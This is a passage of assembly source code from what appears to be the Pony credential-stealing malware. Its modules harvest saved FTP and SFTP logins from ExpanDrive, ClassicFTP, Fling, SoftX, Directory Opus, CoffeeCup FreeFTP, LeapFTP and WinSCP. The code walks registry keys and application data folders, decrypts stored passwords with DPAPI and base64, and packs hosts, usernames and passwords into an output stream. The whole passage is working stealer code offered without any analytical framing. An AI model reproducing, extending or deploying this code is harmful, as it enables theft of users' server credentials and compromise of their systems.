	invoke	AppDataCommonFileScan, stream, offset CBitKinexAppDataDir, offset CBitKinexXmlFileMask, ITEMHDR_ID or 0

	invoke	StreamUpdateModuleLen, stream, hdr_ofs
	ret
GrabBitKinex endp

ENDIF

; -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
; ExpanDrive 1.8.4
; http://www.expandrive.com/
; Tested: v2.1.0
; Tested: v2.1.5
; Tested: v2.2.2
; SFTP: implemented

IFDEF COMPILE_MODULE_EXPANDRIVE

.data
	CExpanDriveServer	db	'Hostname',0
	CExpanDriveUser		db	'Username',0
	CExpanDrivePassword	db	'Password',0
	CExpanDrivePort		db	'Port',0
	CExpanDriveBasePath	db	'Software\ExpanDrive\Sessions',0	
	CExpanDriveAppDataDir	db	'\ExpanDrive',0
	szExpanDriveJSFile	db	'\drives.js',0
	szExpanDriveJSPassStart db 	'"password" : "',0
	szExpanDriveJSPassEnd	db	'",',0
	szExpanDriveRegPath	db	'Software\ExpanDrive',0
	szExpanDriveRegValue	db	'ExpanDrive_Home',0

.code

ExpanDriveScanReg proc stream, BasePath
	LOCAL	hkHandle: DWORD
	LOCAL	KeyIndex: DWORD
	LOCAL	dwBufLen: DWORD
	LOCAL	lpBuf[2048]: BYTE
	LOCAL	S: DWORD
	LOCAL	Host: DWORD
	LOCAL	User: DWORD
	LOCAL	Password: DWORD
	LOCAL	Port: DWORD
	LOCAL	dwPortLen: DWORD
	LOCAL	dwPasswordLen: DWORD
	
	invoke	RegOpenKey, dwCurrentUserKey, BasePath, addr hkHandle
	.IF	!eax
		mov	KeyIndex, 0
		.WHILE	TRUE
			mov	dwBufLen, 2047
			invoke	RegEnumKeyEx, hkHandle, KeyIndex, addr lpBuf, addr dwBufLen, NULL, NULL, NULL, NULL
			.IF	eax
				.BREAK
			.ENDIF
			
			invoke	PonyStrCat, BasePath, addr szSlash
			push	eax
			mov	edx, eax
			invoke	PonyStrCat, edx, addr lpBuf
			mov	S, eax
			call	MemFree
			
			invoke	RegReadValueStr, dwCurrentUserKey, S, addr CExpanDrivePassword, addr dwPasswordLen
			mov	Password, eax 
			invoke	RegReadValueStr, dwCurrentUserKey, S, addr CExpanDriveServer, NULL
			mov	Host, eax 
			invoke	RegReadValueStr, dwCurrentUserKey, S, addr CExpanDriveUser, NULL
			mov	User, eax 

			invoke	RegReadValueStr, dwCurrentUserKey, S, addr CExpanDrivePort, addr dwPortLen
			.IF	eax && dwPortLen == 4
				m2m	Port, dword ptr[eax]
				invoke	MemFree, eax
			.ELSE
				.IF	eax
					invoke	MemFree, eax
				.ENDIF
				mov	Port, 21
			.ENDIF
			
			.IF	Password && Host && User
				invoke	CommonCryptUnprotectData, Password, addr dwPasswordLen, NULL
				.IF	eax && dwPasswordLen
					; export data, type = 0000: Host | User | Pass | Port
					invoke	StreamWriteDWORD, stream, ITEMHDR_ID or 0
					invoke	StreamWriteString, stream, Host
					invoke	StreamWriteString, stream, User
					invoke	StreamWriteBinaryString, stream, Password, dwPasswordLen
					invoke	StreamWriteDWORD, stream, Port
				.ENDIF
			.ENDIF
			
			invoke	MemFree, Password
			invoke	MemFree, Host
			invoke	MemFree, User

			invoke	MemFree, S
			inc	KeyIndex
		.ENDW
		invoke	RegCloseKey, hkHandle
	.ENDIF
	ret
ExpanDriveScanReg endp

ExpanDriveProcessDrivesJSPass proc stream, pass
	LOCAL	decoded_pass: DWORD
	LOCAL	pass_len: DWORD
	LOCAL	decoded_len: DWORD
	
	invoke	lstrlen, pass
	mov	pass_len, eax
	
	invoke	MemAlloc, pass_len
	mov	decoded_pass, eax
	
	invoke	Base64Decode, pass, pass_len, decoded_pass
	.IF	eax
		mov	decoded_len, eax
		invoke	CommonCryptUnprotectData, decoded_pass, addr decoded_len, NULL
		.IF	eax
			; Export crypted-decrypted password pair
			invoke	StreamWriteDWORD, stream, ITEMHDR_ID or 1000h
			invoke	StreamWriteBinaryString, stream, pass, pass_len
			invoke	StreamWriteBinaryString, stream, decoded_pass, decoded_len
		.ENDIF
	.ENDIF
	
	invoke	MemFree, decoded_pass
	
	ret
ExpanDriveProcessDrivesJSPass endp

ExpanDriveProcessDrivesJSFile proc uses esi stream, szFileName
	LOCAL	map: MappedFile
	LOCAL	js_str: DWORD
	LOCAL	js_pass_start: DWORD

	invoke	FileExists, szFileName
	.IF	!eax
		ret
	.ENDIF
	
	invoke	MapFile, szFileName, addr map
	.IF	eax
		invoke	MemAlloc, map.dwFileSize
		mov	js_str, eax
		
		invoke	MoveMem, map.lpMem, js_str, map.dwFileSize
		mov	esi, js_str
		
		.WHILE	byte ptr[esi]
			invoke	StrStrI, esi, offset szExpanDriveJSPassStart
			.IF	!eax
				.BREAK
			.ENDIF
			mov	esi, eax
			invoke	lstrlen, offset szExpanDriveJSPassStart
			add	esi, eax
			mov	js_pass_start, esi
			invoke	StrStrI, esi, offset szExpanDriveJSPassEnd
			.IF	!eax
				.BREAK
			.ENDIF
			mov	dl, byte ptr[eax]
			mov	byte ptr[eax], 0
			push	eax
			push	edx
			invoke	ExpanDriveProcessDrivesJSPass, stream, js_pass_start 
			pop	edx
			pop	eax
			mov	byte ptr[eax], dl
		.ENDW
		
		; Export drives.js file
		invoke	StreamWriteDWORD, stream, ITEMHDR_ID or 1001h
		invoke	StreamWriteBinaryString, stream, js_str, map.dwFileSize
		
		invoke	MemFree, js_str
		invoke	UnmapFile, addr map
	.ELSE
	.ENDIF
	
	ret
ExpanDriveProcessDrivesJSFile endp

GrabExpanDrive proc stream
	LOCAL	hdr_ofs: DWORD

	invoke	StreamWriteModuleHeader, stream, MODULE_EXPANDRIVE, 0
	mov	hdr_ofs, eax
	
	invoke	ExpanDriveScanReg, stream, offset CExpanDriveBasePath

	invoke	RegReadValueStr, dwCurrentUserKey, offset szExpanDriveRegPath, offset szExpanDriveRegValue, NULL
	.IF	eax
		invoke	PonyStrCatFreeArg1, eax, offset szExpanDriveJSFile
		push	eax
		invoke	ExpanDriveProcessDrivesJSFile, stream, eax
		call	MemFree
	.ENDIF

	invoke	SHGetFolderPathStr, CSIDL_APPDATA
	.IF	eax
		invoke	PonyStrCatFreeArg1, eax, offset CExpanDriveAppDataDir
		invoke	PonyStrCatFreeArg1, eax, offset szExpanDriveJSFile
		push	eax
		invoke	ExpanDriveProcessDrivesJSFile, stream, eax
		call	MemFree
	.ENDIF

	invoke	SHGetFolderPathStr, CSIDL_LOCAL_APPDATA
	.IF	eax
		invoke	PonyStrCatFreeArg1, eax, offset CExpanDriveAppDataDir
		invoke	PonyStrCatFreeArg1, eax, offset szExpanDriveJSFile
		push	eax
		invoke	ExpanDriveProcessDrivesJSFile, stream, eax
		call	MemFree
	.ENDIF

	invoke	SHGetFolderPathStr, CSIDL_COMMON_APPDATA
	.IF	eax
		invoke	PonyStrCatFreeArg1, eax, offset CExpanDriveAppDataDir
		invoke	PonyStrCatFreeArg1, eax, offset szExpanDriveJSFile
		push	eax
		invoke	ExpanDriveProcessDrivesJSFile, stream, eax
		call	MemFree
	.ENDIF

	invoke	StreamUpdateModuleLen, stream, hdr_ofs
	ret
GrabExpanDrive endp

ENDIF

; -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
; ClassicFTP 2.14
; http://www.nchsoftware.com/classic/index.html
; Tested: ClassicFTP 2.15
; Tested: ClassicFTP 2.16
; Tested: ClassicFTP 2.22
; SFTP: not supported

IFDEF COMPILE_MODULE_CLASSICFTP

.data
	CClassicFTPServer	db	'Server',0
	CClassicFTPUser		db	'UserName',0
	CClassicFTPPassword1	db	'Password',0
	CClassicFTPPassword2	db	'_Password',0
	CClassicFTPDir		db	'Directory',0
	CClassicFTPBasePath	db	'Software\NCH Software\ClassicFTP\FTPAccounts',0

.code

ClassicFTPScanReg proc stream, BaseKey, BasePath
	LOCAL	hkHandle: DWORD
	LOCAL	KeyIndex: DWORD
	LOCAL	dwBufLen: DWORD
	LOCAL	lpBuf[2048]: BYTE
	LOCAL	S: DWORD
	LOCAL	Host: DWORD
	LOCAL	User: DWORD
	LOCAL	Password1: DWORD
	LOCAL	Password2: DWORD
	LOCAL	Dir: DWORD
	
	invoke	RegOpenKey, BaseKey, BasePath, addr hkHandle
	.IF	!eax
		mov	KeyIndex, 0
		.WHILE	TRUE
			mov	dwBufLen, 2047
			invoke	RegEnumKeyEx, hkHandle, KeyIndex, addr lpBuf, addr dwBufLen, NULL, NULL, NULL, NULL
			.IF	eax
				.BREAK
			.ENDIF
			
			invoke	PonyStrCat, BasePath, addr szSlash
			push	eax
			mov	edx, eax
			invoke	PonyStrCat, edx, addr lpBuf
			mov	S, eax
			call	MemFree
			
			invoke	RegReadValueStr, BaseKey, S, addr CClassicFTPPassword1, NULL
			mov	Password1, eax
 			invoke	RegReadValueStr, BaseKey, S, addr CClassicFTPPassword2, NULL
			mov	Password2, eax 
			invoke	RegReadValueStr, BaseKey, S, addr CClassicFTPServer, NULL
			mov	Host, eax 
			invoke	RegReadValueStr, BaseKey, S, addr CClassicFTPUser, NULL
			mov	User, eax 
			invoke	RegReadValueStr, BaseKey, S, addr CClassicFTPDir, NULL
			mov	Dir, eax
			
			.IF	(Password1 || Password2) && Host && User
				; export data, type = 0000: Host | User | Pass1 | Pass2 | Dir
				invoke	StreamWriteDWORD, stream, ITEMHDR_ID or 0
				invoke	StreamWriteString, stream, Host
				invoke	StreamWriteString, stream, User
				invoke	StreamWriteString, stream, Password1
				invoke	StreamWriteString, stream, Password2
				invoke	StreamWriteString, stream, Dir
			.ENDIF
			
			invoke	MemFree, Password1
			invoke	MemFree, Password2
			invoke	MemFree, Host
			invoke	MemFree, User
			invoke	MemFree, Dir
			
			; recursively scan subfolders
			invoke	ClassicFTPScanReg, stream, BaseKey, S			
			invoke	MemFree, S
					 			
			inc	KeyIndex			
		.ENDW
		invoke	RegCloseKey, hkHandle
	.ENDIF
	ret
ClassicFTPScanReg endp

GrabClassicFTP proc stream
	LOCAL	hdr_ofs: DWORD

	invoke	StreamWriteModuleHeader, stream, MODULE_CLASSICFTP, 0
	mov	hdr_ofs, eax
	
	invoke	ClassicFTPScanReg, stream, HKEY_LOCAL_MACHINE, offset CClassicFTPBasePath
	invoke	ClassicFTPScanReg, stream, dwCurrentUserKey, offset CClassicFTPBasePath
	
	invoke	StreamUpdateModuleLen, stream, hdr_ofs
	ret
GrabClassicFTP endp

ENDIF

; -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
; Fling 2.23
; http://www.nchsoftware.com/fling/index.html
; Tested: Fling 2.24
; Tested: Fling 2.26
; SFTP: not supported

IFDEF COMPILE_MODULE_FLING

.data
	FlingServer		db	'FtpServer',0
	FlingUser		db	'FtpUserName',0
	FlingPassword1		db	'FtpPassword',0
	FlingPassword2		db	'_FtpPassword',0
	FlingDir		db	'FtpDirectory',0
	FlingBasePath		db	'SOFTWARE\NCH Software\Fling\Accounts',0

.code

FlingScanReg proc stream, BaseKey, BasePath
	LOCAL	hkHandle: DWORD
	LOCAL	KeyIndex: DWORD
	LOCAL	dwBufLen: DWORD
	LOCAL	lpBuf[2048]: BYTE
	LOCAL	S: DWORD
	LOCAL	Host: DWORD
	LOCAL	User: DWORD
	LOCAL	Password1: DWORD
	LOCAL	Password2: DWORD
	LOCAL	Dir: DWORD
	
	invoke	RegOpenKey, BaseKey, BasePath, addr hkHandle
	.IF	!eax
		mov	KeyIndex, 0
		.WHILE	TRUE
			mov	dwBufLen, 2047
			invoke	RegEnumKeyEx, hkHandle, KeyIndex, addr lpBuf, addr dwBufLen, NULL, NULL, NULL, NULL
			.IF	eax
				.BREAK
			.ENDIF
			
			invoke	PonyStrCat, BasePath, addr szSlash
			push	eax
			mov	edx, eax
			invoke	PonyStrCat, edx, addr lpBuf
			mov	S, eax
			call	MemFree
			
			invoke	RegReadValueStr, BaseKey, S, addr FlingPassword1, NULL
			mov	Password1, eax
 			invoke	RegReadValueStr, BaseKey, S, addr FlingPassword2, NULL
			mov	Password2, eax 
			invoke	RegReadValueStr, BaseKey, S, addr FlingServer, NULL
			mov	Host, eax 
			invoke	RegReadValueStr, BaseKey, S, addr FlingUser, NULL
			mov	User, eax 
			invoke	RegReadValueStr, BaseKey, S, addr FlingDir, NULL
			mov	Dir, eax
			
			.IF	(Password1 || Password2) && Host && User
				; export data, type = 0000: Host | User | Pass1 | Pass2 | Dir
				invoke	StreamWriteDWORD, stream, ITEMHDR_ID or 0
				invoke	StreamWriteString, stream, Host
				invoke	StreamWriteString, stream, User
				invoke	StreamWriteString, stream, Password1
				invoke	StreamWriteString, stream, Password2
				invoke	StreamWriteString, stream, Dir
			.ENDIF
			
			invoke	MemFree, Password1
			invoke	MemFree, Password2
			invoke	MemFree, Host
			invoke	MemFree, User
			invoke	MemFree, Dir
			
			; recursively scan subfolders
			invoke	FlingScanReg, stream, BaseKey, S			
			invoke	MemFree, S
			
			inc	KeyIndex			
		.ENDW
		invoke	RegCloseKey, hkHandle
	.ENDIF
	ret
FlingScanReg endp

GrabFling proc stream
	LOCAL	hdr_ofs: DWORD

	invoke	StreamWriteModuleHeader, stream, MODULE_FLING, 0
	mov	hdr_ofs, eax
	
	invoke	FlingScanReg, stream, dwCurrentUserKey, offset FlingBasePath
	invoke	FlingScanReg, stream, HKEY_LOCAL_MACHINE, offset FlingBasePath
	
	invoke	StreamUpdateModuleLen, stream, hdr_ofs
	ret
GrabFling endp

ENDIF

; -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
; SoftX 3.3
; http://www.softx.org/ftp.html
; Tested: SoftX 3.3
; SFTP: not supported

IFDEF COMPILE_MODULE_SOFTX

.data
	CSoftXBasePath1		db	'Software\FTPClient\Sites',0
	CSoftXBasePath2		db	'Software\SoftX.org\FTPClient\Sites',0

.code

SoftXScanReg proc stream, BaseKey, BasePath
	LOCAL	hkHandle: DWORD
	LOCAL	KeyIndex: DWORD
	LOCAL	dwBufLen: DWORD
	LOCAL	lpBuf[2048]: BYTE
	LOCAL	PasswordValue: DWORD
	LOCAL	dwPasswordLen: DWORD
	
	invoke	RegOpenKey, BaseKey, BasePath, addr hkHandle
	.IF	!eax
		mov	KeyIndex, 0
		.WHILE	TRUE
			mov	dwBufLen, 2047
			invoke	RegEnumValue, hkHandle, KeyIndex, addr lpBuf, addr dwBufLen, NULL, NULL, NULL, NULL
			.IF	eax
				.BREAK
			.ENDIF
			
			invoke	RegReadValueStr, BaseKey, BasePath, addr lpBuf, addr dwPasswordLen
			mov	PasswordValue, eax
			
			.IF	eax && dwPasswordLen
				invoke	CommonAppendData, stream, PasswordValue, dwPasswordLen, ITEMHDR_ID or 0
			.ENDIF
			
			invoke	MemFree, PasswordValue
			
			inc	KeyIndex			
		.ENDW
		invoke	RegCloseKey, hkHandle
	.ENDIF
	ret
SoftXScanReg endp

GrabSoftX proc stream
	LOCAL	hdr_ofs: DWORD

	invoke	StreamWriteModuleHeader, stream, MODULE_SOFTX, 0
	mov	hdr_ofs, eax
	
	invoke	SoftXScanReg, stream, dwCurrentUserKey, offset CSoftXBasePath1
	invoke	SoftXScanReg, stream, HKEY_LOCAL_MACHINE, offset CSoftXBasePath1
	invoke	SoftXScanReg, stream, dwCurrentUserKey, offset CSoftXBasePath2
	invoke	SoftXScanReg, stream, HKEY_LOCAL_MACHINE, offset CSoftXBasePath2
	
	invoke	StreamUpdateModuleLen, stream, hdr_ofs
	ret
GrabSoftX endp

ENDIF

; -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
; Directory Opus 9.5.6.0.3937 (64-bit)
; http://www.gpsoft.com.au/
; Tested: Directory Opus 10.0.1.0.4192 (32-bit)
; Tested: Directory Opus 10.0.2.0.4269 (64-bit)
; Tested: Directory Opus 10.0.5.0.4269 (32-bit)
; SFTP: implemented

IFDEF COMPILE_MODULE_DIRECTORYOPUS

.data
	CDOpusFTPOxcMask	db	'.oxc',0
	CDOpusFTPOllMask	db	'.oll',0
	CDOpusFTPLastConn	db	'ftplast.osd',0
	CDOpusFTPAppDataDir	db	'\GPSoftware\Directory Opus',0

.code

DOpusFTPCommonFileScan proc stream, csidl
	invoke	SHGetFolderPathStr, csidl
	.IF	eax
		invoke	PonyStrCatFreeArg1, eax, offset CDOpusFTPAppDataDir
		push	eax
		push	eax
		push	eax
		invoke	CommonFileScan, stream, eax, offset CDOpusFTPOxcMask, ITEMHDR_ID or 0
		pop	eax
		invoke	CommonFileScan, stream, eax, offset CDOpusFTPOllMask, ITEMHDR_ID or 1
		pop	eax
		invoke	CommonFileScan, stream, eax, offset CDOpusFTPLastConn, ITEMHDR_ID or 2
		call	MemFree
	.ENDIF
	ret
DOpusFTPCommonFileScan endp

GrabDirectoryOpus proc stream
	LOCAL	hdr_ofs: DWORD

	invoke	StreamWriteModuleHeader, stream, MODULE_DIRECTORYOPUS, 0
	mov	hdr_ofs, eax
	
	invoke	DOpusFTPCommonFileScan, stream, CSIDL_APPDATA
	invoke	DOpusFTPCommonFileScan, stream, CSIDL_COMMON_APPDATA
	invoke	DOpusFTPCommonFileScan, stream, CSIDL_LOCAL_APPDATA
	
	invoke	StreamUpdateModuleLen, stream, hdr_ofs

	ret
GrabDirectoryOpus endp

ENDIF

; -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
; CoffeeCup FreeFTP 4.3 / DirectFTP
; http://www.coffeecup.com/free-ftp/
; Tested: Version 4.4, Build 1904
; Tested: Version 4.5, Build 1941
; SFTP: implemented

IFDEF COMPILE_MODULE_FREEFTP

.data
	CFreeFTPCcsFile1	db	'\SharedSettings.ccs',0
	CFreeFTPCcsFile2	db	'\SharedSettings_1_0_5.ccs',0
	CFreeFTPSqliteFile1	db	'\SharedSettings.sqlite',0
	CFreeFTPSqliteFile2	db	'\SharedSettings_1_0_5.sqlite',0
	CFreeFTPAppDataDir	db	'\CoffeeCup Software',0

.code

FreeFTPCommonFileScan proc stream, csidl, dir
	LOCAL	shell_folder: DWORD

	invoke	SHGetFolderPathStr, csidl
	.IF	eax
		mov	shell_folder, eax

		.IF	dir
			invoke	PonyStrCatFreeArg1, shell_folder, dir
			mov	shell_folder, eax
		.ENDIF

		invoke	PonyStrCat, shell_folder, offset CFreeFTPCcsFile1
		push	eax
		invoke	CommonAppendFile, stream, eax, ITEMHDR_ID or 0
		call	MemFree
		invoke	PonyStrCat, shell_folder, offset CFreeFTPSqliteFile1
		push	eax
		invoke	CommonAppendFile, stream, eax, ITEMHDR_ID or 1
		call	MemFree

		invoke	PonyStrCat, shell_folder, offset CFreeFTPCcsFile2
		push	eax
		invoke	CommonAppendFile, stream, eax, ITEMHDR_ID or 0
		call	MemFree
		invoke	PonyStrCat, shell_folder, offset CFreeFTPSqliteFile2
		push	eax
		invoke	CommonAppendFile, stream, eax, ITEMHDR_ID or 1
		call	MemFree

		invoke	MemFree, shell_folder
	.ENDIF
	ret
FreeFTPCommonFileScan endp	

GrabFreeFTP proc stream
	LOCAL	hdr_ofs: DWORD

	invoke	StreamWriteModuleHeader, stream, MODULE_FREEFTP, 0
	mov	hdr_ofs, eax
	
	invoke	FreeFTPCommonFileScan, stream, CSIDL_APPDATA, NULL
	invoke	FreeFTPCommonFileScan, stream, CSIDL_COMMON_APPDATA, NULL
	invoke	FreeFTPCommonFileScan, stream, CSIDL_LOCAL_APPDATA, NULL

	invoke	FreeFTPCommonFileScan, stream, CSIDL_APPDATA, offset CFreeFTPAppDataDir
	invoke	FreeFTPCommonFileScan, stream, CSIDL_COMMON_APPDATA, offset CFreeFTPAppDataDir
	invoke	FreeFTPCommonFileScan, stream, CSIDL_LOCAL_APPDATA, offset CFreeFTPAppDataDir
	
	invoke	StreamUpdateModuleLen, stream, hdr_ofs

	ret
GrabFreeFTP endp

ENDIF

; -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
; LeapFTP 2.6.2.470, 3.1.0.50
; http://www.leapware.com/
; Tested: 3.1.0.50
; SFTP: implemented

IFDEF COMPILE_MODULE_LEAPFTP

.data
	CLeapFTPIntalledName	db	'leapftp',0
	CLeapFTPUninstaller	db	'unleap.exe',0
	CLeapFTPDatFile		db	'sites.dat',0
	CLeapFTPIniFile		db	'sites.ini',0
	CLeapFTPAppDataDir	db	'\LeapWare\LeapFTP',0
	CLeapFTPRegPath		db	'SOFTWARE\LeapWare',0
	CLeapFTPRegValue1	db	'InstallPath',0
	CLeapFTPRegValue2	db	'DataDir',0

.code

LeapFTPScanReg proc stream, BaseKey, BasePath
	LOCAL	hkHandle: DWORD
	LOCAL	KeyIndex: DWORD
	LOCAL	dwBufLen: DWORD
	LOCAL	lpBuf[2048]: BYTE
	LOCAL	S: DWORD
	LOCAL	Dir1: DWORD
	LOCAL	Dir2: DWORD	
	
	invoke	RegOpenKey, BaseKey, BasePath, addr hkHandle
	.IF	!eax
		mov	KeyIndex, 0
		.WHILE	TRUE
			mov	dwBufLen, 2047
			invoke	RegEnumKeyEx, hkHandle, KeyIndex, addr lpBuf, addr dwBufLen, NULL, NULL, NULL, NULL
			.IF	eax
				.BREAK
			.ENDIF
			
			invoke	PonyStrCat, BasePath, addr szSlash
			push	eax
			mov	edx, eax
			invoke	PonyStrCat, edx, addr lpBuf
			mov	S, eax
			call	MemFree
			
			invoke	RegReadValueStr, BaseKey, S, addr CLeapFTPRegValue1, NULL
			mov	Dir1, eax
 			invoke	RegReadValueStr, BaseKey, S, addr CLeapFTPRegValue2, NULL
			mov	Dir2, eax 
			
			.IF	Dir1
				invoke	CommonFileScan, stream, Dir1, offset CLeapFTPDatFile, ITEMHDR_ID or 0
				invoke	CommonFileScan, stream, Dir1, offset CLeapFTPIniFile, ITEMHDR_ID or 1
			.ENDIF
			
			.IF	Dir2
				invoke	CommonFileScan, stream, Dir2, offset CLeapFTPDatFile, ITEMHDR_ID or 0
				invoke	CommonFileScan, stream, Dir2, offset CLeapFTPIniFile, ITEMHDR_ID or 1				
			.ENDIF

			invoke	MemFree, Dir1
			invoke	MemFree, Dir2
			
			; recursively scan subfolders
			invoke	LeapFTPScanReg, stream, BaseKey, S			
			invoke	MemFree, S
					 			
			inc	KeyIndex			
		.ENDW
		invoke	RegCloseKey, hkHandle
	.ENDIF
	ret
LeapFTPScanReg endp

LeapFTPCommonFileScan proc stream, csidl
	invoke	SHGetFolderPathStr, csidl
	.IF	eax
		invoke	PonyStrCatFreeArg1, eax, offset CLeapFTPAppDataDir
		push	eax
		push	eax
		invoke	CommonFileScan, stream, eax, offset CLeapFTPDatFile, ITEMHDR_ID or 0
		pop	eax
		invoke	CommonFileScan, stream, eax, offset CLeapFTPIniFile, ITEMHDR_ID or 1
		call	MemFree
	.ENDIF
	ret
LeapFTPCommonFileScan endp

GrabLeapFTP proc uses esi edi stream
	LOCAL	hdr_ofs: DWORD

	invoke	StreamWriteModuleHeader, stream, MODULE_LEAPFTP, 0
	mov	hdr_ofs, eax
	
	mov	esi, lpInstalledList
	mov	edi, lpInstalledNames
	.IF	byte ptr[edi]
	@n:
		invoke	StrStr, esi, offset CLeapFTPUninstaller
		.IF	eax
			; older uninstaller
			inc	eax ; skip spacing char
			.IF	byte ptr[eax]
				push	eax
				invoke	lstrlen, offset CLeapFTPUninstaller
				pop	edx
				add	eax, edx
				invoke	ExtractFilePath, eax
				push	eax
				push	eax
				invoke	CommonFileScan, stream, eax, offset CLeapFTPDatFile, ITEMHDR_ID or 0
				pop	eax
				invoke	CommonFileScan, stream, eax, offset CLeapFTPIniFile, ITEMHDR_ID or 1
				call	MemFree
			.ENDIF
		.ELSE
			; newer uninstaller
			invoke	StrStrI, edi, offset CLeapFTPIntalledName
			.IF	eax
				invoke	ExtractFilePath, esi
				push	eax
				push	eax
				invoke	CommonFileScan, stream, eax, offset CLeapFTPDatFile, ITEMHDR_ID or 0
				pop	eax
				invoke	CommonFileScan, stream, eax, offset CLeapFTPIniFile, ITEMHDR_ID or 1
				call	MemFree
			.ENDIF
		.ENDIF
		.WHILE	byte ptr[esi]
			inc	esi
		.ENDW
		inc	esi
		
		@Next	@n
	.ENDIF
		
	invoke	LeapFTPCommonFileScan, stream, CSIDL_APPDATA
	invoke	LeapFTPCommonFileScan, stream, CSIDL_COMMON_APPDATA
	invoke	LeapFTPCommonFileScan, stream, CSIDL_LOCAL_APPDATA
	
	invoke	LeapFTPScanReg, stream, dwCurrentUserKey, offset CLeapFTPRegPath
	invoke	LeapFTPScanReg, stream, HKEY_LOCAL_MACHINE, offset CLeapFTPRegPath
	
	invoke	StreamUpdateModuleLen, stream, hdr_ofs
	ret
GrabLeapFTP endp

ENDIF

; -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
; WinSCP 4.3.2 (Build 1201)
; http://winscp.net
; Tested: Version 4.3.4 (Build 1428)
; Tested: Version 5.0.5 beta
; SFTP: implemented

IFDEF COMPILE_MODULE_WINSCP

.data
	CWinSCPPassword		db	'Password',0
	CWinSCPServer		db	'HostName',0
	CWinSCPUser		db	'UserName',0
	CWinSCPDir		db	'RemoteDirectory',0
	CWinSCPPort		db	'PortNumber',0
	CWinSCPProtocol	db	'FSProtocol',0
	CWinSCPBasePath		db	'Software\Martin Prikryl',0

.code

WinSCPScanReg proc stream, BaseKey, BasePath
	LOCAL	hkHandle: DWORD
	LOCAL	KeyIndex: DWORD
	LOCAL	dwBufLen: DWORD
	LOCAL	lpBuf[2048]: BYTE
	LOCAL	S: DWORD
	LOCAL	Host: DWORD
	LOCAL	User: DWORD
	LOCAL	Password: DWORD
	LOCAL	dwPortLen: DWORD
	LOCAL	Dir: DWORD
	LOCAL	Port: DWORD
	LOCAL	Protocol: DWORD
	LOCAL	dwProtocolLen: DWORD
	
	invoke	RegOpenKey, BaseKey, BasePath, addr hkHandle
	.IF	!eax
		mov	KeyIndex, 0
		.WHILE	TRUE
			mov	dwBufLen, 2047
			invoke	RegEnumKeyEx, hkHandle, KeyIndex, addr lpBuf, addr dwBufLen, NULL, NULL, NULL, NULL
			.IF	eax
				.BREAK
			.ENDIF
			
			invoke	PonyStrCat, BasePath, addr szSlash
			push	eax
			mov	edx, eax
			invoke	PonyStrCat, edx, addr lpBuf
			mov	S, eax
			call	MemFree
			
			invoke	RegReadValueStr, BaseKey, S, addr CWinSCPPassword, NULL
			mov	Password, eax
			invoke	RegReadValueStr, BaseKey, S, addr CWinSCPServer, NULL
			mov	Host, eax 
			invoke	RegReadValueStr, BaseKey, S, addr CWinSCPUser, NULL
			mov	User, eax 
			invoke	RegReadValueStr, BaseKey, S, addr CWinSCPDir, NULL
			mov	Dir, eax
			
			invoke	RegReadValueStr, dwCurrentUserKey, S, addr CWinSCPPort, addr dwPortLen
			.IF	eax && dwPortLen == 4
				m2m	Port, dword ptr[eax]
				invoke	MemFree, eax
			.ELSE
				.IF	eax
					invoke	MemFree, eax
				.ENDIF
				mov	Port, 21
			.ENDIF
			
			invoke	RegReadValueStr, BaseKey, S, addr CWinSCPProtocol, addr dwProtocolLen
			mov	Protocol, eax

			.IF	Password && Host && User
				; export data, type = 0000: Host | User | Pass | Port | Dir
				; export data, type = 0010: Host | User | Pass | Port | Dir | Protocol
				invoke	StreamWriteDWORD, stream, ITEMHDR_ID or 10h
				invoke	StreamWriteString, stream, Host
				invoke	StreamWriteString, stream, User
				invoke	StreamWriteString, stream, Password
				invoke	StreamWriteDWORD, stream, Port
				invoke	StreamWriteString, stream, Dir
				.IF	Protocol && dwProtocolLen == 4
					mov	eax, Protocol
					invoke	StreamWriteDWORD, stream, dword ptr[eax]
				.ELSE
					invoke	StreamWriteDWORD, stream, 0
				.ENDIF
			.ENDIF
			
			invoke	MemFree, Password
			invoke	MemFree, Host
			invoke	MemFree, User
			invoke	MemFree, Dir
			invoke	MemFree, Protocol
			
			; recursively scan subfolders
			invoke	WinSCPScanReg, stream, BaseKey, S			
			invoke	MemFree, S
			
			inc	KeyIndex			
		.ENDW
		invoke	RegCloseKey, hkHandle
	.ENDIF
	ret
WinSCPScanReg endp

GrabWinSCP proc stream
	LOCAL	hdr_ofs: DWORD

	invoke	StreamWriteModuleHeader, stream, MODULE_WINSCP, 0
	mov	hdr_ofs, eax
	
	invoke	WinSCPScanReg, stream, dwCurrentUserKey, offset CWinSCPBasePath
	invoke	WinSCPScanReg, stream, HKEY_LOCAL_MACHINE, offset CWinSCPBasePath
	
	invoke	StreamUpdateModuleLen, stream, hdr_ofs
	ret
GrabWinSCP endp

ENDIF

